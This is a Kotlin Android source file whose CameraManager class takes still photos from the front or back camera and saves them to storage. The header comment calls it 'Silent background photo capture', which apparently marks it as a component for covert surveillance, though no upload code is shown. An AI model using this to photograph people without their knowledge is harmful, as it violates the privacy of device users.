package com.sync.xxx.managers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import androidx.core.app.ActivityCompat
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.text.SimpleDateFormat
import java.util.*

/**
 * CameraManager.kt
 * Capture still photos from front and back camera
 * Silent background photo capture
 */
class CameraManager(private val context: Context) {

    private val TAG = "CameraManager"
    private var cameraManager: android.hardware.camera2.CameraManager = 
        context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    
    enum class CameraFacing {
        FRONT, BACK
    }

    init {
        startBackgroundThread()
    }

    /**
     * Capture photo
     * @param facing Camera facing direction
     * @param outputPath Custom output path (optional)
     * @param callback Callback with file path on success
     */
    fun capturePhoto(
        facing: CameraFacing,
        outputPath: String? = null,
        callback: (String?) -> Unit
    ) {
        if (!hasPermission()) {
            Log.e(TAG, "Camera permission not granted")
            callback(null)
            return
        }

        try {
            val cameraId = getCameraId(facing)
            if (cameraId == null) {
                Log.e(TAG, "No camera found for facing: $facing")
                callback(null)
                return
            }

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
                callback(null)
                return
            }

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    captureStillPicture(camera, outputPath, callback)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    callback(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    callback(null)
                }
            }, backgroundHandler)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture photo", e)
            callback(null)
        }
    }

    /**
     * Capture still picture
     */
    private fun captureStillPicture(
        cameraDevice: CameraDevice,
        outputPath: String?,
        callback: (String?) -> Unit
    ) {
        try {
            val imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
            
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val filePath = saveImage(image, outputPath)
                        callback(filePath)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to save image", e)
                        callback(null)
                    } finally {
                        image.close()
                        reader.close()
                        cameraDevice.close()
                    }
                } else {
                    callback(null)
                    reader.close()
                    cameraDevice.close()
                }
            }, backgroundHandler)

            val surface = imageReader.surface
            val captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder.addTarget(surface)
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)

            cameraDevice.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        try {
                            session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(
                                    session: CameraCaptureSession,
                                    request: CaptureRequest,
                                    result: TotalCaptureResult
                                ) {
                                    Log.d(TAG, "Capture completed")
                                }

                                override fun onCaptureFailed(
                                    session: CameraCaptureSession,
                                    request: CaptureRequest,
                                    failure: CaptureFailure
                                ) {
                                    Log.e(TAG, "Capture failed")
                                    callback(null)
                                }
                            }, backgroundHandler)
                        } catch (e: Exception) {
                            Log.e(TAG, "Capture exception", e)
                            callback(null)
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Configuration failed")
                        callback(null)
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture still picture", e)
            callback(null)
        }
    }

    /**
     * Save image to file
     */
    private fun saveImage(image: Image, outputPath: String?): String? {
        return try {
            val buffer: ByteBuffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            
            val file = if (outputPath != null) {
                File(outputPath)
            } else {
                createOutputFile()
            }
            
            if (file == null) {
                return null
            }
            
            FileOutputStream(file).use { output ->
                output.write(bytes)
            }
            
            Log.d(TAG, "Image saved: ${file.absolutePath}")
            file.absolutePath
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save image", e)
            null
        }
    }

    /**
     * Get camera ID for facing direction
     */
    private fun getCameraId(facing: CameraFacing): String? {
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val cameraFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
                
                val targetFacing = if (facing == CameraFacing.FRONT) {
                    CameraCharacteristics.LENS_FACING_FRONT
                } else {
                    CameraCharacteristics.LENS_FACING_BACK
                }
                
                if (cameraFacing == targetFacing) {
                    return cameraId
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting camera ID", e)
        }
        return null
    }

    /**
     * Create output file
     */
    private fun createOutputFile(): File? {
        return try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "photo_$timestamp.jpg"
            
            val storageDir = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                "Camera"
            )
            
            if (!storageDir.exists()) {
                storageDir.mkdirs()
            }
            
            File(storageDir, fileName)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create output file", e)
            null
        }
    }

    /**
     * Start background thread
     */
    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground")
        backgroundThread?.start()
        backgroundHandler = Handler(backgroundThread?.looper!!)
    }

    /**
     * Stop background thread
     */
    private fun stopBackgroundThread() {
        try {
            backgroundThread?.quitSafely()
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping background thread", e)
        }
    }

    /**
     * Check if camera permission is granted
     */
    private fun hasPermission(): Boolean {
        return ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Cleanup resources
     */
    fun cleanup() {
        stopBackgroundThread()
    }

    companion object {
        /**
         * Delete photo file
         */
        fun deletePhoto(filePath: String): Boolean {
            return try {
                val file = File(filePath)
                if (file.exists()) {
                    file.delete()
                } else {
                    false
                }
            } catch (e: Exception) {
                Log.e("CameraManager", "Failed to delete file", e)
                false
            }
        }

        /**
         * Check if camera permission is granted
         */
        fun hasPermission(context: Context): Boolean {
            return ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED
        }
    }
}
